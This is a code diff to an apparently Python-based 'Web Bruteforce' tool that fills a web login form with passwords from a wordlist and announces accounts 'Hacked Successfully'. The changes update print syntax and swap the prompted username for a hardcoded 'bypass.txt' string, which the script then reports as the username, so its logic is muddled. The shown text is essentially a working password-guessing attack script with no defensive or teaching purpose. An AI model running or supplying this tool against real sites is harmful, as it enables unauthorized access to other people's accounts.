@@ -11,7 +11,7 @@ def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
 def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk)) 
 def prBlack(skk): print("\033[98m {}\033[00m" .format(skk)) 
 
-os.system('clc')
+os.system('clear')
 banner = """
 
 ██╗    ██╗███████╗██████╗ ███████╗ ██████╗ ██████╗  ██████╗███████╗
@@ -22,7 +22,7 @@ banner = """
  ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
 
                                                                    """
-print banner
+print (banner)
 
 print("                            Edmark.net ")
 print("                          Web Bruteforce")
@@ -39,7 +39,8 @@ u = raw_input("User Form: ")
 p = raw_input("Password Form: ")
 
 #email
-email = str(raw_input("\n\nUsername: "))
+#email = str(raw_input("\n\nUsername: "))
+un = 'bypass.txt'
 wp = 'wordlist.txt'
 #wordlist
 passwordlist = str(raw_input("Press Enter to Start")) + wp
@@ -78,8 +79,8 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print("\n[+] Username: " + email + " Password: {}".format(password))
-			print("[+] " + email + " Has been Hacked Successfully!!!") 
+			print("\n[+] Username: " + un + " Password: {}".format(password))
+			print("[+] " + un + " Has been Hacked Successfully!!!") 
 			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
 			if m == 'y':
 				exit()
@@ -101,7 +102,7 @@ def welcome():
 	total = open(passwordlist,"r")
 	total = total.readlines()
 	print
-	print (" [*] Account to crack : {}".format(email))
+	print (" [*] Account to crack : {}".format(un))
 	print (' [*] Possible Passwords: ')
 	print (" [*] Cracking, please wait ...\n\n")
 
